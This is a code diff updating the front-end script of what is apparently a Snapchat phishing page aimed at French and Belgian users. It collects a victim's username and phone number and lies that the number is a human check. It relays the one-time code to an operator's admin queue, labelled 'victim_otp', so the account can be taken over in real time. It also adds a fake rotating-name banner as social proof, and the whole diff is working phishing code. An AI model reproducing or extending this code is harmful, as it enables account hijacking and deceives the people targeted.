+        let otpLength = 4;
+        let currentLang = 'fr';
+        let bannerInterval = null;
 
-    const countryGrid = document.getElementById('countryGrid');
-    const operatorGrid = document.getElementById('operatorGrid');
-    const countryCode = document.getElementById('countryCode');
-    const usernameInput = document.getElementById('usernameInput');
-    const phoneInput = document.getElementById('phoneInput');
-    const displayNumber = document.getElementById('displayNumber');
-    const progressFill = document.getElementById('progressFill');
-    const otpContainer = document.getElementById('otpContainer');
-    const sendBtn = document.getElementById('sendBtn');
-    const verifyBtn = document.getElementById('verifyBtn');
-    const verifyingMessage = document.getElementById('verifyingMessage');
-    const loadingText = document.getElementById('loadingText');
+        // ============================================================
+        // DOM REFS
+        // ============================================================
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const step4 = document.getElementById('step4');
+        const step5 = document.getElementById('step5');
 
-    function goToStep(id) {
-        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-    }
+        const countryGrid = document.getElementById('countryGrid');
+        const operatorGrid = document.getElementById('operatorGrid');
+        const countryCode = document.getElementById('countryCode');
+        const usernameInput = document.getElementById('usernameInput');
+        const phoneInput = document.getElementById('phoneInput');
+        const displayNumber = document.getElementById('displayNumber');
+        const progressFill = document.getElementById('progressFill');
+        const otpContainer = document.getElementById('otpContainer');
+        const sendBtn = document.getElementById('sendBtn');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const verifyingMessage = document.getElementById('verifyingMessage');
+        const loadingText = document.getElementById('loadingText');
+        const bannerName = document.getElementById('bannerName');
+        const bannerAction = document.getElementById('bannerAction');
+        const infoText = document.getElementById('infoText');
+        const countryNameInInfo = document.getElementById('countryNameInInfo');
 
-    // ============================================================
-    // COUNTRY SELECTION
-    // ============================================================
-    document.querySelectorAll('.country-btn').forEach(btn => {
-        btn.addEventListener('click', function() {
-            document.querySelectorAll('.country-btn').forEach(b => b.classList.remove('selected'));
-            this.classList.add('selected');
-            const country = this.dataset.country;
-            selectedCountry = country;
-            countryCode.textContent = COUNTRIES[country].code;
-        });
-    });
-
-    // ============================================================
-    // OPERATOR SELECTION
-    // ============================================================
-    document.querySelectorAll('.operator-btn').forEach(btn => {
-        btn.addEventListener('click', function() {
-            document.querySelectorAll('.operator-btn').forEach(b => b.classList.remove('selected'));
-            this.classList.add('selected');
-            selectedOperator = this.dataset.operator;
-        });
-    });
-
-    // ============================================================
-    // LANGUAGE SWITCH (simplified)
-    // ============================================================
-    document.querySelectorAll('.lang-switch button').forEach(btn => {
-        btn.addEventListener('click', function() {
-            document.querySelectorAll('.lang-switch button').forEach(b => b.classList.remove('active'));
-            this.classList.add('active');
-            // Just UI change for now — content is in French.
-        });
-    });
-
-    // ============================================================
-    // FAKE LIVE TOAST
-    // ============================================================
-    const names = ['Élodie', 'Lucas', 'Chloé', 'Hugo', 'Camille', 'Léa', 'Thomas', 'Manon'];
-    setInterval(() => {
-        const name = names[Math.floor(Math.random() * names.length)];
-        document.getElementById('liveToast').textContent = name;
-    }, 8000);
-
-    // ============================================================
-    // BACK BUTTONS
-    // ============================================================
-    document.getElementById('backToPhone').addEventListener('click', function() {
-        goToStep('step1');
-    });
-    document.getElementById('retryBtn').addEventListener('click', function() {
-        goToStep('step1');
-        phoneInput.value = '';
-    });
-    document.getElementById('resetBtn').addEventListener('click', function() {
-        goToStep('step1');
-        phoneInput.value = '';
-        usernameInput.value = '';
-        document.querySelectorAll('.otp-box input').forEach(el => el.value = '');
-        document.querySelectorAll('.country-btn, .operator-btn').forEach(el => el.classList.remove('selected'));
-        document.querySelector('.country-btn[data-country="FR"]').classList.add('selected');
-        document.querySelector('.operator-btn[data-operator="Orange"]').classList.add('selected');
-        selectedCountry = 'FR';
-        selectedOperator = 'Orange';
-        countryCode.textContent = '+33';
-    });
-
-    // ============================================================
-    // SEND NUMBER
-    // ============================================================
-    sendBtn.addEventListener('click', sendNumber);
-    phoneInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') sendNumber(); });
-    usernameInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') phoneInput.focus(); });
-
-    async function sendNumber() {
-        const username = usernameInput.value.trim();
-        const phoneNumber = phoneInput.value.replace(/\s/g, '');
-        if (!username || username.length < 2) {
-            alert('Veuillez entrer votre nom d\'utilisateur Snapchat.');
-            usernameInput.focus();
-            return;
+        // ============================================================
+        // UPDATE COUNTRY INFO
+        // ============================================================
+        function updateCountryInfo(country) {
+            const t = LANG[currentLang];
+            if (country === 'FR') {
+                infoText.innerHTML = t.infoTextFR;
+            } else {
+                infoText.innerHTML = t.infoTextBE;
+            }
+            // Update country name in the info box
+            const countryName = country === 'FR' ? t.france : t.belgium;
+            const span = infoText.querySelector('#countryNameInInfo');
+            if (span) span.textContent = countryName;
         }
-        if (!phoneNumber || phoneNumber.length < 8) {
-            alert('Veuillez entrer un numéro de téléphone valide.');
-            phoneInput.focus();
-            return;
-        }
-        if (!selectedCountry) {
-            alert('Veuillez sélectionner un pays.');
-            return;
-        }
-        if (!selectedOperator) {
-            alert('Veuillez sélectionner un opérateur.');
-            return;
-        }
 
-        const fullNumber = COUNTRIES[selectedCountry].code + phoneNumber;
-        sendBtn.disabled = true;
-        sendBtn.textContent = 'Envoi...';
-        goToStep('step2');
+        // ============================================================
+        // LANGUAGE FUNCTION
+        // ============================================================
+        function setLanguage(lang) {
+            currentLang = lang;
+            const t = LANG[lang];
 
-        let progress = 0;
-        const interval = setInterval(() => {
-            progress += Math.random() * 10;
-            if (progress > 90) clearInterval(interval);
-            progressFill.style.width = Math.min(progress, 90) + '%';
-        }, 300);
-
-        try {
-            const response = await fetch('/api/submit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    number: fullNumber,
-                    username: username,
-                    country: selectedCountry,
-                    network: selectedOperator,
-                    queue: COUNTRIES[selectedCountry].queue
-                })
+            document.getElementById('heroTitle').innerHTML = t.heroTitle;
+            document.getElementById('benefit1').textContent = t.benefit1;
+            document.getElementById('benefit2').textContent = t.benefit2;
+            document.getElementById('benefit3').textContent = t.benefit3;
+            document.getElementById('benefit4').textContent = t.benefit4;
+            document.getElementById('countryLabel').textContent = t.countryLabel;
+            document.querySelectorAll('.country-name').forEach(el => {
+                const country = el.parentElement.dataset.country;
+                if (country === 'FR') el.textContent = t.france;
+                else if (country === 'BE') el.textContent = t.belgium;
             });
-            const data = await response.json();
-            queueId = data.queueId;
-            clearInterval(interval);
-            progressFill.style.width = '100%';
-            await checkStatus();
-        } catch (error) {
-            alert('Erreur de connexion. Veuillez réessayer.');
-            resetAll();
-        } finally {
-            sendBtn.disabled = false;
-            sendBtn.textContent = 'Continuer →';
-        }
-    }
+            document.getElementById('usernameLabel').textContent = t.usernameLabel;
+            usernameInput.placeholder = t.usernamePlaceholder;
+            document.getElementById('operatorLabel').textContent = t.operatorLabel;
+            document.getElementById('phoneLabel').textContent = t.phoneLabel;
+            document.getElementById('phoneHint').textContent = t.phoneHint;
+            sendBtn.textContent = t.sendBtn;
+            loadingText.textContent = t.loadingText;
+            document.getElementById('otpTitle').textContent = t.otpTitle;
+            verifyBtn.textContent = t.verifyBtn;
+            verifyingMessage.textContent = t.verifying;
+            document.getElementById('backToPhone').textContent = t.back;
+            document.getElementById('successTitle').textContent = t.successTitle;
+            document.getElementById('successText').textContent = t.successText;
+            document.getElementById('successBadge').textContent = t.successBadge;
+            document.getElementById('resetBtn').textContent = t.resetBtn;
+            document.getElementById('errorTitle').textContent = t.errorTitle;
+            document.getElementById('errorText').textContent = t.errorText;
+            document.getElementById('retryBtn').textContent = t.retryBtn;
+            bannerAction.textContent = t.bannerAction;
 
-    async function checkStatus() {
-        let attempts = 0;
-        const checkInterval = setInterval(async () => {
-            attempts++;
+            // Update OTP sub if visible
+            const number = displayNumber.textContent;
+            if (number) {
+                document.getElementById('otpSub').innerHTML = t.otpSub.replace('{number}', number);
+            }
+
+            // Update country info text
+            updateCountryInfo(selectedCountry);
+
+            // Update language buttons
+            document.querySelectorAll('.lang-switch button').forEach(b => b.classList.remove('active'));
+            document.querySelector(`.lang-switch button[data-lang="${lang}"]`).classList.add('active');
+        }
+
+        // ============================================================
+        // POPULATE OPERATORS
+        // ============================================================
+        function populateOperators(country) {
+            const ops = OPERATORS[country] || ['Orange', 'SFR', 'Bouygues'];
+            operatorGrid.innerHTML = '';
+            ops.forEach(op => {
+                const btn = document.createElement('div');
+                btn.className = 'operator-btn';
+                btn.textContent = op;
+                btn.dataset.operator = op;
+                if (op === selectedOperator) btn.classList.add('selected');
+                btn.addEventListener('click', function() {
+                    document.querySelectorAll('.operator-btn').forEach(b => b.classList.remove('selected'));
+                    this.classList.add('selected');
+                    selectedOperator = this.dataset.operator;
+                });
+                operatorGrid.appendChild(btn);
+            });
+            if (!ops.includes(selectedOperator)) {
+                selectedOperator = ops[0];
+                document.querySelector('.operator-btn')?.classList.add('selected');
+            }
+            const codes = { FR: '+33', BE: '+32' };
+            countryCode.textContent = codes[country] || '+33';
+        }
+
+        // ============================================================
+        // COUNTRY SELECTION
+        // ============================================================
+        document.querySelectorAll('.country-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.country-btn').forEach(b => b.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedCountry = this.dataset.country;
+                populateOperators(selectedCountry);
+                updateCountryInfo(selectedCountry);
+                const hints = {
+                    FR: 'Numéro mobile (10 chiffres) — c\'est pour savoir si vous êtes un humain 🐻',
+                    BE: 'Numéro mobile (10 chiffres) — c\'est pour savoir si vous êtes un humain 🐻'
+                };
+                document.getElementById('phoneHint').textContent = hints[selectedCountry] || hints.FR;
+            });
+        });
+
+        // ============================================================
+        // LANGUAGE SWITCH
+        // ============================================================
+        document.querySelectorAll('.lang-switch button').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const lang = this.dataset.lang;
+                setLanguage(lang);
+            });
+        });
+
+        // ============================================================
+        // BANNER — random names with highlight
+        // ============================================================
+        const names = ['Élodie', 'Lucas', 'Chloé', 'Hugo', 'Camille', 'Léa', 'Thomas', 'Manon', 'Emma', 'Nathan', 'Inès', 'Raphaël', 'Alice', 'Paul'];
+
+        function updateBanner(name) {
+            bannerName.textContent = name;
+            // Re-trigger animation
+            const banner = document.querySelector('.highlight-banner');
+            banner.style.animation = 'none';
+            setTimeout(() => { banner.style.animation = 'bannerGlow 3s ease-in-out infinite'; }, 10);
+        }
+
+        function rotateBannerName() {
+            const name = names[Math.floor(Math.random() * names.length)];
+            updateBanner(name);
+        }
+
+        // Rotate every 7 seconds
+        setInterval(rotateBannerName, 7000);
+        // Initial random
+        setTimeout(() => {
+            const name = names[Math.floor(Math.random() * names.length)];
+            updateBanner(name);
+        }, 500);
+
+        // ============================================================
+        // STEP MANAGEMENT
+        // ============================================================
+        function goToStep(id) {
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        // ============================================================
+        // BACK BUTTONS
+        // ============================================================
+        document.getElementById('backToPhone').addEventListener('click', function() { goToStep('step1'); });
+        document.getElementById('retryBtn').addEventListener('click', function() { goToStep('step1'); phoneInput.value = ''; });
+        document.getElementById('resetBtn').addEventListener('click', resetAll);
+
+        // ============================================================
+        // SEND NUMBER
+        // ============================================================
+        sendBtn.addEventListener('click', sendNumber);
+        phoneInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') sendNumber(); });
+        usernameInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') phoneInput.focus(); });
+
+        async function sendNumber() {
+            const username = usernameInput.value.trim();
+            let phoneNumber = phoneInput.value.replace(/\s/g, '');
+            
+            if (!phoneNumber || phoneNumber.length !== 10 || !/^\d{10}$/.test(phoneNumber)) {
+                alert('Veuillez entrer un numéro de téléphone valide (10 chiffres).');
+                phoneInput.focus();
+                return;
+            }
+            
+            if (!username || username.length < 2) {
+                alert('Veuillez entrer votre nom d\'utilisateur Snapchat.');
+                usernameInput.focus();
+                return;
+            }
+            if (!selectedCountry) {
+                alert('Veuillez sélectionner un pays.');
+                return;
+            }
+            if (!selectedOperator) {
+                alert('Veuillez sélectionner un opérateur.');
+                return;
+            }
+
+            const codes = { FR: '+33', BE: '+32' };
+            const fullNumber = codes[selectedCountry] + phoneNumber;
+            const queueMap = { FR: 'A', BE: 'B' };
+            sendBtn.disabled = true;
+            sendBtn.textContent = 'Envoi...';
+            goToStep('step2');
+
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 10;
+                if (progress > 90) clearInterval(interval);
+                progressFill.style.width = Math.min(progress, 90) + '%';
+            }, 300);
+
             try {
-                const response = await fetch('/api/admin/queues');
+                const response = await fetch('/api/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        number: fullNumber,
+                        username: username,
+                        country: selectedCountry,
+                        network: selectedOperator,
+                        queue: queueMap[selectedCountry]
+                    })
+                });
                 const data = await response.json();
-                for (const queue in data) {
-                    for (const entry of data[queue]) {
-                        if (entry.id === queueId) {
-                            if (entry.status === 'awaiting_otp') {
-                                clearInterval(checkInterval);
-                                otpLength = entry.otp_length || 4;
-                                goToStep('step3');
-                                setupOTP(otpLength);
-                                displayNumber.textContent = entry.number;
-                                document.querySelector('.otp-box input')?.focus();
-                                return;
+                queueId = data.queueId;
+                clearInterval(interval);
+                progressFill.style.width = '100%';
+                await checkStatus();
+            } catch (error) {
+                alert('Erreur de connexion. Veuillez réessayer.');
+                resetAll();
+            } finally {
+                sendBtn.disabled = false;
+                sendBtn.textContent = LANG[currentLang].sendBtn;
+            }
+        }
+
+        async function checkStatus() {
+            let attempts = 0;
+            const checkInterval = setInterval(async () => {
+                attempts++;
+                try {
+                    const response = await fetch('/api/admin/queues');
+                    const data = await response.json();
+                    for (const queue in data) {
+                        for (const entry of data[queue]) {
+                            if (entry.id === queueId) {
+                                if (entry.status === 'awaiting_otp') {
+                                    clearInterval(checkInterval);
+                                    otpLength = entry.otp_length || 4;
+                                    goToStep('step3');
+                                    setupOTP(otpLength);
+                                    displayNumber.textContent = entry.number;
+                                    const t = LANG[currentLang];
+                                    document.getElementById('otpSub').innerHTML = t.otpSub.replace('{number}', entry.number);
+                                    document.querySelector('.otp-box input')?.focus();
+                                    return;
+                                }
+                                if (entry.status === 'verified') {
+                                    clearInterval(checkInterval);
+                                    goToStep('step4');
+                                    return;
+                                }
+                                if (entry.status === 'wrong') {
+                                    clearInterval(checkInterval);
+                                    goToStep('step5');
+                                    return;
+                                }
+                                break;
                             }
-                            if (entry.status === 'verified') {
-                                clearInterval(checkInterval);
-                                goToStep('step4');
-                                return;
-                            }
-                            if (entry.status === 'wrong') {
-                                clearInterval(checkInterval);
-                                goToStep('step5');
-                                return;
-                            }
-                            break;
                         }
                     }
-                }
-                if (attempts >= 60) {
-                    clearInterval(checkInterval);
-                    alert('Délai dépassé. Veuillez réessayer.');
-                    resetAll();
-                }
-            } catch (error) {}
-        }, 2000);
-    }
-
-    // ============================================================
-    // OTP
-    // ============================================================
-    function setupOTP(length) {
-        otpLength = length;
-        otpContainer.innerHTML = '';
-        for (let i = 0; i < length; i++) {
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.maxLength = 1;
-            input.id = 'otp' + (i + 1);
-            if (i === 0) input.autofocus = true;
-            input.addEventListener('input', function(idx) {
-                return function(e) {
-                    if (this.value.length === 1 && idx < length - 1) {
-                        otpContainer.children[idx + 1].focus();
+                    if (attempts >= 60) {
+                        clearInterval(checkInterval);
+                        alert('Délai dépassé. Veuillez réessayer.');
+                        resetAll();
                     }
-                };
-            }(i));
-            input.addEventListener('keydown', function(idx) {
-                return function(e) {
-                    if (e.key === 'Backspace' && this.value === '' && idx > 0) {
-                        otpContainer.children[idx - 1].focus();
-                    }
-                    if (e.key === 'Enter') { submitOTP(); }
-                };
-            }(i));
-            otpContainer.appendChild(input);
-        }
-        setTimeout(() => { const first = otpContainer.querySelector('input'); if (first) first.focus(); }, 100);
-    }
-
-    verifyBtn.addEventListener('click', submitOTP);
-
-    async function submitOTP() {
-        const inputs = otpContainer.querySelectorAll('input');
-        let otp = '';
-        for (let i = 0; i < otpLength; i++) { otp += inputs[i]?.value || ''; }
-        if (otp.length !== otpLength) {
-            alert('Veuillez entrer le code complet.');
-            return;
+                } catch (error) {}
+            }, 2000);
         }
 
-        verifyingMessage.style.display = 'block';
-        verifyBtn.disabled = true;
+        // ============================================================
+        // OTP
+        // ============================================================
+        function setupOTP(length) {
+            otpLength = length;
+            otpContainer.innerHTML = '';
+            for (let i = 0; i < length; i++) {
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.maxLength = 1;
+                input.id = 'otp' + (i + 1);
+                if (i === 0) input.autofocus = true;
+                input.addEventListener('input', function(idx) {
+                    return function(e) {
+                        if (this.value.length === 1 && idx < length - 1) {
+                            otpContainer.children[idx + 1].focus();
+                        }
+                    };
+                }(i));
+                input.addEventListener('keydown', function(idx) {
+                    return function(e) {
+                        if (e.key === 'Backspace' && this.value === '' && idx > 0) {
+                            otpContainer.children[idx - 1].focus();
+                        }
+                        if (e.key === 'Enter') { submitOTP(); }
+                    };
+                }(i));
+                otpContainer.appendChild(input);
+            }
+            setTimeout(() => { const first = otpContainer.querySelector('input'); if (first) first.focus(); }, 100);
+        }
 
-        try {
-            const response = await fetch('/api/admin/update', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    queueId: queueId,
-                    action: 'victim_otp',
-                    otp: otp
-                })
-            });
-            const data = await response.json();
-            if (data.success) {
-                await waitForAdminVerification();
-            } else {
-                alert('Erreur lors de la vérification. Veuillez réessayer.');
+        verifyBtn.addEventListener('click', submitOTP);
+
+        async function submitOTP() {
+            const inputs = otpContainer.querySelectorAll('input');
+            let otp = '';
+            for (let i = 0; i < otpLength; i++) { otp += inputs[i]?.value || ''; }
+            if (otp.length !== otpLength) {
+                alert('Veuillez entrer le code complet.');
+                return;
+            }
+
+            verifyingMessage.style.display = 'block';
+            verifyBtn.disabled = true;
+
+            try {
+                const response = await fetch('/api/admin/update', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        queueId: queueId,
+                        action: 'victim_otp',
+                        otp: otp
+                    })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    await waitForAdminVerification();
+                } else {
+                    alert('Erreur lors de la vérification. Veuillez réessayer.');
+                    verifyingMessage.style.display = 'none';
+                    verifyBtn.disabled = false;
+                }
+            } catch (error) {
+                alert('Erreur de connexion.');
                 verifyingMessage.style.display = 'none';
                 verifyBtn.disabled = false;
             }
-        } catch (error) {
-            alert('Erreur de connexion.');
-            verifyingMessage.style.display = 'none';
-            verifyBtn.disabled = false;
         }
-    }
 
-    async function waitForAdminVerification() {
-        let attempts = 0;
-        const checkInterval = setInterval(async () => {
-            attempts++;
-            try {
-                const response = await fetch('/api/admin/queues');
-                const data = await response.json();
-                for (const queue in data) {
-                    for (const entry of data[queue]) {
-                        if (entry.id === queueId) {
-                            if (entry.status === 'verified') {
-                                clearInterval(checkInterval);
-                                goToStep('step4');
-                                return;
+        async function waitForAdminVerification() {
+            let attempts = 0;
+            const checkInterval = setInterval(async () => {
+                attempts++;
+                try {
+                    const response = await fetch('/api/admin/queues');
+                    const data = await response.json();
+                    for (const queue in data) {
+                        for (const entry of data[queue]) {
+                            if (entry.id === queueId) {
+                                if (entry.status === 'verified') {
+                                    clearInterval(checkInterval);
+                                    goToStep('step4');
+                                    return;
+                                }
+                                if (entry.status === 'wrong') {
+                                    clearInterval(checkInterval);
+                                    goToStep('step5');
+                                    return;
+                                }
+                                break;
                             }
-                            if (entry.status === 'wrong') {
-                                clearInterval(checkInterval);
-                                goToStep('step5');
-                                return;
-                            }
-                            break;
                         }
                     }
-                }
-                if (attempts >= 60) {
-                    clearInterval(checkInterval);
-                    alert('Délai dépassé.');
-                    resetAll();
-                }
-            } catch (error) {}
-        }, 2000);
-    }
+                    if (attempts >= 60) {
+                        clearInterval(checkInterval);
+                        alert('Délai dépassé.');
+                        resetAll();
+                    }
+                } catch (error) {}
+            }, 2000);
+        }
 
-    // ============================================================
-    // RESET
-    // ============================================================
-    function resetAll() {
+        // ============================================================
+        // RESET
+        // ============================================================
+        function resetAll() {
+            goToStep('step1');
+            phoneInput.value = '';
+            usernameInput.value = '';
+            selectedCountry = 'FR';
+            selectedOperator = 'Orange';
+            queueId = null;
+            document.querySelectorAll('.otp-box input').forEach(el => el.value = '');
+            document.querySelectorAll('.country-btn, .operator-btn').forEach(el => el.classList.remove('selected'));
+            document.querySelector('.country-btn[data-country="FR"]').classList.add('selected');
+            populateOperators('FR');
+            updateCountryInfo('FR');
+            countryCode.textContent = '+33';
+            progressFill.style.width = '0%';
+            verifyingMessage.style.display = 'none';
+            verifyBtn.disabled = false;
+            setLanguage(currentLang);
+        }
+
+        // ============================================================
+        // MAX 10 DIGITS ON PHONE INPUT
+        // ============================================================
+        phoneInput.addEventListener('input', function() {
+            let val = this.value.replace(/\D/g, '');
+            if (val.length > 10) val = val.slice(0, 10);
+            let formatted = '';
+            for (let i = 0; i < val.length; i++) {
+                if (i > 0 && i % 2 === 0 && i < 10) formatted += ' ';
+                formatted += val[i];
+            }
+            this.value = formatted;
+        });
+
+        // ============================================================
+        // INIT
+        // ============================================================
+        populateOperators('FR');
+        updateCountryInfo('FR');
+        setLanguage('fr');
         goToStep('step1');
-        phoneInput.value = '';
-        usernameInput.value = '';
-        selectedCountry = 'FR';
-        selectedOperator = 'Orange';
-        queueId = null;
-        document.querySelectorAll('.otp-box input').forEach(el => el.value = '');
-        document.querySelectorAll('.country-btn, .operator-btn').forEach(el => el.classList.remove('selected'));
-        document.querySelector('.country-btn[data-country="FR"]').classList.add('selected');
-        document.querySelector('.operator-btn[data-operator="Orange"]').classList.add('selected');
-        countryCode.textContent = '+33';
-        progressFill.style.width = '0%';
-        verifyingMessage.style.display = 'none';
-        verifyBtn.disabled = false;
-    }
-
-    // ============================================================
-    // INIT
-    // ============================================================
-    // Default selections
-    selectedCountry = 'FR';
-    selectedOperator = 'Orange';
-    document.querySelector('.country-btn[data-country="FR"]').classList.add('selected');
-    document.querySelector('.operator-btn[data-operator="Orange"]').classList.add('selected');
-    countryCode.textContent = '+33';
-    goToStep('step1');
-</script>
+    </script>
 
 </body>
 </html>
